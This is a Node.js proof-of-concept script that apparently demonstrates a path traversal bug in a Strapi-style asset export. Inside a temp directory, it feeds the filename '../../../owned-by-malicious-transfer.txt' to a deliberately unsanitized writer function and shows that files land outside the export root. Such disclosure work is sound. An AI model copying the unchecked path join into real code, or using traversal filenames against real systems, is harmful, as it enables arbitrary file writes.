#!/usr/bin/env node
'use strict';

const fs = require('node:fs');
const fsp = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { Readable, pipeline } = require('node:stream');

async function writeAssetLikeLocalDirectoryDestination(root, data) {
  const { filename } = data;
  const entryPath = path.join(root, 'assets', 'uploads', filename);
  const entryMetadataPath = path.join(root, 'assets', 'metadata', `${filename}.json`);

  fs.mkdirSync(path.dirname(entryPath), { recursive: true });
  fs.mkdirSync(path.dirname(entryMetadataPath), { recursive: true });
  fs.writeFileSync(entryMetadataPath, JSON.stringify(data.metadata), 'utf8');

  await new Promise((resolve, reject) => {
    pipeline(data.stream, fs.createWriteStream(entryPath), (error) =>
      error ? reject(error) : resolve()
    );
  });

  return { entryPath, entryMetadataPath };
}

async function main() {
  const base = await fsp.mkdtemp(path.join(os.tmpdir(), 'strapi-dir-export-poc-'));
  const exportRoot = path.join(base, 'export-root');
  const attackerFilename = '../../../owned-by-malicious-transfer.txt';

  const result = await writeAssetLikeLocalDirectoryDestination(exportRoot, {
    filename: attackerFilename,
    metadata: { id: 1, name: 'malicious asset' },
    stream: Readable.from('arbitrary file content written outside export root\n'),
  });

  const escapedFile = path.resolve(exportRoot, 'assets', 'uploads', attackerFilename);
  const escapedMetadata = path.resolve(
    exportRoot,
    'assets',
    'metadata',
    `${attackerFilename}.json`
  );

  console.log(`Export root:       ${exportRoot}`);
  console.log(`Asset write path:  ${result.entryPath}`);
  console.log(`Metadata path:     ${result.entryMetadataPath}`);
  console.log(`Escaped file:      ${escapedFile}`);
  console.log(`Escaped metadata:  ${escapedMetadata}`);
  console.log(`Escaped file exists outside root: ${fs.existsSync(escapedFile)}`);
  console.log(`Escaped file content: ${(await fsp.readFile(escapedFile, 'utf8')).trim()}`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
